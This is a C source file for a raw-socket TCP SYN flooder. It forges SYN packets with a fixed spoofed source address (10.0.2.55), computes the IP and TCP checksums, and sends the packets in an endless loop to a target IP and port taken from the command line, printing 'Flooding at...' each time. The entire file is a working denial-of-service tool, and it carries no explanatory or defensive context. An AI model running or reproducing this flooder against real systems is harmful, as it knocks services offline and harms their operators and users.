#include <unistd.h>
#include <stdio.h>
#include <sys/socket.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <stdlib.h>
#include <string.h>
#include <arpa/inet.h>

struct pseudo_header{
	unsigned int source_address;
	unsigned int dest_address;
	unsigned char placeholder;
	unsigned char protocol;
	unsigned short tcp_length;
	struct tcphdr tcp;
};

unsigned short csum (unsigned short *ptr, int nbytes)
{
	register long sum;
	unsigned short oddbyte;
	register short answer;
	sum = 0;
	while(nbytes > 0){
		sum += *ptr++;
		nbytes-= 2;
	}
	if(nbytes == 1){
		oddbyte = 0;
		*((u_char*)&oddbyte) = *(u_char*)ptr;
		sum+=oddbyte;
	}
	sum = (sum >> 16) + (sum & 0xffff);
	sum += (sum >> 16);
	answer = (short)~sum;
	return answer;
}

int main (int argc, char *argv[])
{
	int s = socket(PF_INET, SOCK_RAW, IPPROTO_TCP);
	char datagram[4096], source_ip[32];
	struct iphdr *iph = (struct iphdr *) datagram;
	struct tcphdr *tcph = (struct tcphdr *) (datagram + sizeof(struct ip));
        struct sockaddr_in sin;
	struct pseudo_header psh;

	if (argc != 3)
	{
		printf("Invalid Parameters\n");
		exit(-1);
	}

	strcpy(source_ip, "10.0.2.55");
	unsigned int floodport = atoi(argv[2]);
	sin.sin_family = AF_INET;
	sin.sin_port = htons(floodport);
	sin.sin_addr.s_addr = inet_addr(argv[1]);
	memset(datagram, 0, 4096);

	iph->ihl = 5;
	iph->version = 4;
	iph->tos = 0;
	iph->tot_len = sizeof(struct ip) + sizeof(struct tcphdr);
	iph->id = htons(54321);
	iph->frag_off = 0;
	iph->ttl = 255;
	iph->protocol = IPPROTO_TCP;
	iph->check = 0;	
	iph->saddr = inet_addr(source_ip);
	iph->daddr = sin.sin_addr.s_addr;
	iph->check = csum((unsigned short *) datagram, iph->tot_len >> 1);

	tcph->source = htons(1234);
	tcph->dest = htons(floodport);
	tcph->seq = 0;
	tcph->ack_seq = 0;
	tcph->doff = 5;
	//tcph->tcph_offset = 0;
	tcph->fin = 0;
	tcph->syn = 1;
	tcph->rst = 0;
	tcph->psh = 0;
	tcph->ack = 0;
	tcph->urg = 0;
	tcph->window = htonl(5480);
	tcph->check = 0;
	tcph->urg_ptr = 0;

	//iph->iph_chksum = csum((unsigned short *) datagram, iph->iph_len >> 1);

	psh.source_address = inet_addr(source_ip);
	psh.dest_address = sin.sin_addr.s_addr;
	psh.placeholder = 0;
	psh.protocol = IPPROTO_TCP;
	psh.tcp_length = htons(20);

	memcpy(&psh.tcp, tcph, sizeof(struct tcphdr));
	tcph->check = csum((unsigned short *)&psh, sizeof(struct pseudo_header));

	int one = 1;
	const int *val = &one;
	if(setsockopt (s, IPPROTO_IP, IP_HDRINCL, val, sizeof(one)) < 0){
		printf("Error\n");
		printf("Error in setsockopt\n");
		printf("%d\n", setsockopt(s, IPPROTO_IP, IP_HDRINCL, val, sizeof(one)));
		exit(-1);
	}
	else
		printf("Play, using your own header\n");

	while(1){
		if(sendto(s, datagram, iph->tot_len, 0, (struct sockaddr *) &sin, sizeof(sin)) < 0)
			printf("Send To Error !!!\n");
		else
			printf("Flooding at %s at %u...\n", argv[1], floodport);
	}

	return 0;

}

